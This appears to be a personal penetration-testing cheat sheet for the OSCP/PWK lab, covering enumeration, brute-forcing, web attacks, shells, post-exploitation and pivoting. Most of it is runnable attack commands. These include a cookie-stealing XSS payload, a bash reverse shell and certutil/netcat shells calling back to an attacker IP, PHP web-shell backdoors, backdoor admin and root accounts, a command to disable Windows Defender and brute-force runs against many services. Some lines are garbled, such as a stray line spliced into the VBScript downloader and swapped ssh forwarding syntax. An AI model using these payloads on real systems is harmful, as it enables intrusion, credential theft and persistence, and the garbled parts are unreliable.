ENUMERATION
    
    All around scanner
       • python3 autorecon.py $ip -v

    Host Discovery
       •  nmap -sn  10.11.1.1-254 -vv -oA hosts
       •  netdiscover -r 10.11.1.0/24

    DNS server discovery
       •  nmap -p 53  10.11.1.1-254 -vv -oA dcs

-------------------------------------------------------------------------------------------------------------------------------------

PORT

    Port Scanning & Service Detection
        • unicornscan -mT -I 10.11.1.252:a -v 
        • unicornscan -mU -I 10.11.1.252:p -v 
        • nmap -sC -sV -Pn -oA  -vv standard_tcp $ip
        • nmap -sC -sV -sU -Pn -oA  -vv standard_udp $ip
        • nmap -p -sU -sT -Pn 0-65535 -vv -oN all_ports $ip 
        • unicornscan -mU -I 192.168.24.53:a -v -l unicorn_full_udp.txt ;  unicornscan -mT -I 192.168.24.53:a -v -l unicorn_full_tcp.txt


    Vulnerability Scanning
       •nmap -Pn -sT -sU  -p $ports --script=*vuln*  -vv -oN nmap_vuln  $ip 

    Banner Grabbing
       •  nc -nv $ip $port

-------------------------------------------------------------------------------------------------------------------------------------

DNS


    Find DNS server:
       •  nslookup thinc.local 10.11.1.221
       • dig @10.11.1.221 thinc.local


    Forward Lookup Brute Force:
       •  dnsrecon -d example.com -D /usr/share/wordlists/dnsmap.txt -t std --xml dnsrecon.xml


    Reverse Lookup Brute Force:
       •  dnsrecon -d demo.com -t rvl


    DNS Zone Transfers:
       • host -l domain $ip
       • dnsrecon -d megacorpone.com -t axfr
       • dnsenum zonetransfer.me


-------------------------------------------------------------------------------------------------------------------------------------


FTP


    Vulnerability Scanning
        • nmap -p 21 --script="+*ftp* and not brute and not dos and not fuzzer"  -vv -oN ftp $ip


    Deafult Creds
       • hydra -s 21 -C /usr/share/sparta/wordlists/ftp-default-userpass.txt  -u -f $ip ftp

-------------------------------------------------------------------------------------------------------------------------------------

FTP MANUAL SCANS


    Anonymous login

    Enumerate the hell out of the machine!
        • OS version
        • Other software you can find on the machine (Prog Files, yum.log, /bin)
        • password files
        • DLLs for msfpescan / BOF targets

    Do you have UPLOAD potential?
        • Can you trigger execution of uploads?
        • Swap binaries?

    Public exploits for ftp server software



-------------------------------------------------------------------------------------------------------------------------------------

HTTP(S)

    Vulnerability Scanning
        • nmap -p 80,443 --script="+*http* and not brute and not dos and not fuzzer" -vv -oN http(s) $ip
        • Nikto -port 80,443 -host $ip -o  -v nikto.txt or 
        • nikto -Option USERAGENT=Mozilla -url=http://10.11.1.24  -o nikto.txt

    Directories
       •  gobuster dir -u https://10.11.1.35 -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt -t 50 -k -o gobuster

    Subdomains check
       •  https://github.com/OWASP/Amass/ 


    Content Management System Vulnerability Hunter
       •  https://github.com/SecWiki/CMS-Hunter

    Test ssl
       •  ./testssl.sh -e -E -f -p -y -Y -S -P -c -H -U $ip

    Word Press
       •  wpscan --url http://10.11.1.251/wp 


-------------------------------------------------------------------------------------------------------------------------------------

 
MANUAL HTTP SCANS

    Check the source code

    Technologies used
       •whatweb $ip:80 --color=never --log-brief="whattheweb.txt"

    curl -s http://$ip/robots.txt

    Burp
       •  get params
       • post params
       • cookies
       • user agents
       • referrers
       • all the headers
       • change get requests to posts
       • take note of all error codes
       • fuzz parameter values, and names, etc.

    Things to be on look for:
       • Default credentials for software
       •  SQL-injectable GET/POST params
       • XSS
        Test
           •  <script> alert("Hello! I am an alert box!!");</script>
           •  <iframe SRC="http:10.11.0.106/xss_test.html" height = "0" width ="0"></iframe>   
        Exploit
           •  <script>new Image().src="http://10.11.0.106/bogus.php?output="+document.cookie;</script>
           •  LFI/RFI through ?page=foo type params
            LFI:
              •   /etc/passwd | /etc/shadow insta-win
              •   /var/www/html/config.php or similar paths to get SQL etc creds
              •   ?page=php://filter/convert.base64-encode/resource=../config.php
              •   ../../../../../boot.ini to find out windows version
            RFI:
              •   Have your PHP/cgi downloader ready
              •   <?php include $_GET['inc']; ?> simplest backdoor to keep it dynamic without anything messing your output
              •   Then you can just http://$IP/inc.php?inc=http://$YOURIP/bg.php and have full control with minimal footprint on      target machine
              •   get phpinfo()

    HTTPS
       •  Heartbleed / CRIME / Other similar attacks
       •  Read the actual SSL CERT to:
           •  find out potential correct vhost to GET
           •  is the clock skewed
           •  any names that could be usernames for bruteforce/guessing

    LFI Linux Files:
       •  /etc/issue
       •  /proc/version
       •  /etc/profile
       •  /etc/passwd
       •  /etc/shadow
       •  /root/.bash_history
       •  /var/log/dmessage
       •  /var/mail/root
       •  /var/spool/cron/crontabs/root

    LFI Windows Files:
       •  %SYSTEMROOT%\repair\system
       •  %SYSTEMROOT%\repair\SAM
       •  %SYSTEMROOT%\repair\SAM
       •  %WINDIR%\win.ini
       •  %SYSTEMDRIVE%\boot.ini
       •  %WINDIR%\Panther\sysprep.inf
       •  %WINDIR%\system32\config\AppEvent.Evt


-------------------------------------------------------------------------------------------------------------------------------------


MYSQL

    Vulnerability Scanning
        • nmap -p 3306 --script="+*mysql* and not brute and not dos and not fuzzer" -vv -oN mysql $ip

    Deafult Creds
       • hydra -s 3306 -C /usr/share/sparta/wordlists/mysql-default-userpass.txt  -u -f $ip ftp

    Public Exploit 


-------------------------------------------------------------------------------------------------------------------------------------


RPC


    Find NFS Port
       •  nmap -p 111 --script=rpcinfo.nse -vv -oN nfs_port $ip

    Services Running
       •  rpcinfo –p $ip
       • rpcbind -p  rpcinfo –p x.x.x.x


    Null Session/User Rpc login
       •  rpcclient -U "" $ip
             ▪ srvinfo 
             ▪ enumdomusers
             ▪ enumprivs
             ▪ enumalsgroups domain 
             ▪  lookupnames administrators
             ▪ querydominfo 
             ▪  enumdomusers 
             ▪ queryuser john
         
-------------------------------------------------------------------------------------------------------------------------------------


NFS

    Show Mountable NFS Shares
       •  nmap --script=nfs-showmount -oN mountable_shares $ip
       • showmount -e $ip

    List NFS exported shares. If 'rw,no_root_squash' is present, upload and execute sid-shell
       •  chown root:root sid-shell; chmod +s sid-shell
   
   
-------------------------------------------------------------------------------------------------------------------------------------


POP3


    Enumerating user accounts
        • nc -nv $ip 25
            • VRFY user
            • USER user
            • EXPN user


-------------------------------------------------------------------------------------------------------------------------------------

SMB&NETBIOS

    Over All scan
       •  enum4linux -a $ip

    Vulnerability Scanning
       •  nmap --script="+*smb* and not brute and not dos and not fuzzer"  -p 139,445 -oN smb-vuln $ip

    Enumerate Hostnames
       •  nmblookup -A $ip

    List Shares with no creds and guest account
       •  smbmap -H [ip/hostname]
       • nmap --script smb-enum-shares -p 139,445 $ip

    List Shares with creds
       • smbmap -H [ip] -d [domain] -u [user] -p [password]   -r --depth 5 -R

    Connect to share
       •  smbclient \\\\[ip]\\[share name]

    Netbios Information Scanning
       •  nbtscan -r $ip/24

    Nmap find exposed Netbios servers
       •  nmap -sU --script nbstat.nse -p 137 $ip

    Mount smb share:
       • mount -t cifs //<server ip>/<share> <local dir> -o username=”guest”,password=””

-------------------------------------------------------------------------------------------------------------------------------------

SNMP

    Enumeration Tools
       •  Onesixtyone – c <community list file> -I <ip-address>
       • Snmpwalk -c <community string> -v<version> $ip 1.3.6.1.2.1.25.4.2.1.2
       •  snmp-check $ip

    Default Community Names:
       •  public, private, cisco, manager

    Enumerate MIB:
       •  1.3.6.1.2.1.25.1.6.0 System Processes
       •  1.3.6.1.2.1.25.4.2.1.2 Running Programs
       •  1.3.6.1.2.1.25.4.2.1.4 Processes Path
       •  1.3.6.1.2.1.25.2.3.1.4 Storage Units
       •  1.3.6.1.2.1.25.6.3.1.2 Software Name
       •  1.3.6.1.4.1.77.1.2.25 User Accounts
       •  1.3.6.1.2.1.6.13.1.3 TCP Local Ports


    SNMP V3
       •  nmap -p 161 --script=snmp-info $ip
       • default creds:
             ▪ /usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt

-------------------------------------------------------------------------------------------------------------------------------------

DOMAIN

    Nmap:
       •  nmap -p 53 --script=*dns* -vv -oN dns $ip


-------------------------------------------------------------------------------------------------------------------------------------


FILE TRANSFER


    Simple Servers:
       •  pushd /fserver/ ; python -m SimpleHTTPServer 80 ; popd
       •  python -m pyftpdlib -p 21 -w -d /mnt
       •  ptftpd -p 69  -v eth0 /mnt/Secondary/pwk/public/10.11.1.227/ 

    Tools:
       •  Linux:
             ▪  wget http://10.11.0.106/nc.exe -O nc.exe
             ▪  curl http://10.11.0.106/nc.exe 
       • Windows:
             ▪ Power shell one liner 
                   → powershell (new-object System.Net.WebClient).DownloadFile('http://10.11.0.106:80/veil_meterpreter.bat','veil_meterpreter.bat')
             ▪certutil.exe -urlcache -split -f "http://10.11.0.106:8000/nc.exe" nc.exe && nc.exe -nv 10.11.0.106 443 -e cmd.exe
             ▪VBscript
                    → echo strUrl = WScript.Arguments.Item(0) > wget.vbs
                        echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
                        echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
                        echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
                        echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
                        echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
                        echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs
                        echo Err.Clear >> wget.vbs
                        echo Set http = Nothing >> wget.vbs
                        echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
                        echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
                        echcscript wget.vbs http://10.11.0.6/wce32_upx.exe wce32_upex.exe If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
                        echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
                        echo http.Open "GET", strURL, False >> wget.vbs
                        echo http.Send >> wget.vbs
                        echo varByteArray = http.ResponseBody >> wget.vbs
                        echo Set http = Nothing >> wget.vbs
                        echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
                        echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs
                        echo strData = "" >> wget.vbs
                        echo strBuffer = "" >> wget.vbs
                        echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
                        echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs
                        echo Next >> wget.vbs
                        echo ts.Close >> wget.vbs
                  → cscript wget.vbs http://10.11.0.6/wce32_upx.exe wce32_upx.exe
            ▪ FTP Non interactive mode
                   →  ftp -A 10.11.0.106
                   → binary
                   → GET nc.exe
                   → bye
             ▪ TFTP
                   → tftp -i 10.11.0.106 GET exploit.exe


-------------------------------------------------------------------------------------------------------------------------------------

SHELLS

    Spawning a TTY Shell - Break out of Jail or limited shell You should almost always upgrade your shell after taking control of an apache or www user (For example when you encounter an error message when trying to run an exploit sh: no job control in this shell )

    Interactive shell:
       •python -c 'import pty; pty.spawn("/bin/bash")'
       • echo os.system('/bin/bash')

    Adjust Interactive shell:
       •  Ctrl-Z
       •  echo $TERM    //find raws and cols and color
       •  stty raw -echo  
       • fg
       • reset
       • export SHELL=bash
       •  export TERM=xterm256-color
       •  stty rows 38 columns 116

    Php backdoor:
       •  <?php echo shell_exec($_GET['cmd']);?>

    Php shell:
       •  <?php echo shell_exec('bash -i >& /dev/tcp/10.11.0.106/443 0>&1');?>
       • <?php echo shell_exec('certutil.exe -urlcache -split -f "http://10.11.0.106:8000/nc.exe" nc.exe && nc.exe -nv 10.11.0.106 443 -e cmd.exe');?>

-------------------------------------------------------------------------------------------------------------------------------------

PSSWD CRACKING

    John:
       •  john files --wordlist=/usr/share/wordlists/rockyou.txt

    Medusa
       •  Medusa, initiated against an htaccess protected web directory
             ▪  medusa -h $ip -u admin -P password-file.txt -M http -m DIR:/admin -T 10

    Ncrack
       •  ncrack (from the makers of nmap) can brute force RDP
             ▪  ncrack -vv --user offsec -P password-file.txt rdp://$ip

    Hydra

       •  Hydra brute force against SNMP
             ▪ hydra -P password-file.txt -v $ip snmp

       •  Hydra FTP known user and rockyou password list
             ▪ hydra -t 1 -l admin -P /usr/share/wordlists/rockyou.txt -vV $ip ftp

       •  Hydra SSH using list of users and passwords
             ▪ hydra -v -V -u -L users.txt -P passwords.txt -t 1 -u $ip ssh

       •  Hydra SSH using a known password and a username list
             ▪ hydra -v -V -u -L users.txt -p "<known password>" -t 1 -u $ip ssh

       •  Hydra SSH Against Known username on port 22
             ▪ hydra $ip -s 22 ssh -l <user> -P big_wordlist.txt

       •  Hydra POP3 Brute Force
             ▪ hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f $ip pop3 -V

       •  Hydra SMTP Brute Force
             ▪ hydra -P /usr/share/wordlistsnmap.lst $ip smtp -V

       •  Hydra attack http get 401 login with a dictionary
             ▪ hydra -L ./webapp.txt -P ./webapp.txt $ip http-get /admin

       •  Hydra attack Windows Remote Desktop with rockyou
             ▪ hydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt rdp://$ip

       •  Hydra brute force SMB user with rockyou:
             ▪ hydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt $ip smb

       •  Hydra brute force a Wordpress admin login
             ▪ hydra -l admin -P ./passwordlist.txt $ip -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'


-------------------------------------------------------------------------------------------------------------------------------------


POST EXPLOITATION LINUX

    Add user with root privs:
       •  sudo useradd -ou 0 -g 0 john
       •  sudo passwd John@1234

    Combie shadow and passwd files:
       •  unshadow passwd.txt shadow.txt > passwords.txt

    Find listening services:
       •  netstat -alp

    Copy ssh private kets:
       •  /etc/ssh/ssh_host_dsa_key
       • /etc/ssh/ssh_host_key

    Check interseting files
       •  /var/log
       • /var/log/secure
       • /etc/passwd 
       • /etc/shadow 
       • ~/.bash_history
       • ~/.mysql_history 
    Check log files of some of the services:
       • http
       • ftp
       • ssh 
             ▪  grep 'sshd' /var/log/auth.log

    linux Post Exploitation:
       •  ifconfig


-------------------------------------------------------------------------------------------------------------------------------------


POST EXPLOITATION WINDOWS

    Backdoor User:
       •  net user backdoor backdoor@123 /add
       •  net localgroup administrators backdoor /add
       •  net localgroup "Remote Desktop Users" backdoor /add
       • net user admin newpassword 
    Enabling RDP
       •  netsh firewall add portopening TCP 3389 "Open Port 3389" ENABLE ALL
       •  netsh firewall set portopening TCP 3389 proxy ENABLE ALL
       •  netsh firewall set service RemoteDesktop enable
       •  reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

    Disable RDP
       •  reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 1 /f
       •  netsh firewall delete portopening protocol=TCP port=3389


    Check log files of some of the services:
       •  http
       • ftp
       • ssh

    Windows Post Exploitation:
       •  Arp -a 
       •  netstat -ano 
       •  ipconfig /all 
       •  route print 
       •  schtasks /query /fo LIST /v 
       •  netsh firewall show config
       •  Net group
       •  Net localgroup
       •  (for /R ".\" %A in (*.txt) do echo %~fA %~zA) | findstr /v "echo
       •  Net share
       •  Power shell to Enumerate users and computers using powershell



-------------------------------------------------------------------------------------------------------------------------------------


USEFUL LINUX COMMANDS

    Find file by name:
       •  find /home/username/ -name "*.err"

    Find writable directories:
       • find / -perm -o+w 
       • find . -perm -o+w -exec chmod +t {} +
       • find / -writable
       •  find / -type d \( -perm -g+w -or -perm -o+w \) -exec ls -adl {} \; | grep drwxrwsr 

    pipe to clipboard
       •  ls | xclip -selection c

    tar
       •  create
             ▪  tar -cvf linux_priv_esc.tar.gz /root/Desktop
       •  unzip
             ▪ tar xvzf linux_priv_esc.tar.gz

    kerbros auth
       •  xfreerdp /u:alice /v:10.11.1.50

   
-------------------------------------------------------------------------------------------------------------------------------------


USEFUL WINDOWS COMMANDS

    Find log files in directory
       •  dir /s *log* 

    Process
       • tasklist
       • taskkill /F /PID pid_number


    Disable windows defender:
       •  sc stop WinDefend


    UAC bypass:
       •  echo $username = "alice" > run.ps1
       •  echo $secpasswd = ConvertTo-SecureString "aliceishere" -AsPlainText -Force >> run.ps1
         echo $mycreds = New-Object System.Management.Automation.PSCredential ("$username",$secpasswd) >> run.ps1
       •  echo Start-Process veil_meterpreter.bat  -Credential ($mycreds) >> run.ps1

       • powershell -ExecutionPolicy Bypass -File run.ps1 
   

-------------------------------------------------------------------------------------------------------------------------------------


PIVOTING

    Dynamic Port Forwading:
          • SSH 
                  ▪  ssh -D 9000 root@$ip
                  ▪ set proxychains.conf to 127.0.0.1 1080
                  ▪ proxy chains nc -nv 10.11.0.106
           • Reverse SSH from windows to my kali
                  ▪ systemctl start ssh.service
                  ▪putty.exe -ssh root@10.11.0.106 

    Local port forward:

         •  Explanation
                 ▪ ssh -L 80:localhost:80 SUPERSERVER
                 ▪ a connection made to the local port 80 is to be forwarded to port 80 on SUPERSERVER.

         •  SSH
                ▪ ssh -R sourcePort:forwardToHost:onPort connectToHost

    Remote port forward:

          •   Explanation
                 ▪ ssh -R 80:localhost:80 tinyserver
                 ▪ a connection made to the remote port 80 on tiny server is to be forwarded to port 80 on my localhost.

          •   SSH
                ▪ ssh -L sourcePort:forwardToHost:onPort connectToHost 


    Metasploit:
       •  Dynamic Port Forwading
             ▪ autoroute module
                  → set session to meterpreter session
             ▪ socks4a module
                  → set srv port to ( no need to set host)
             ▪  set proxychains.conf to 127.0.0.1 1080



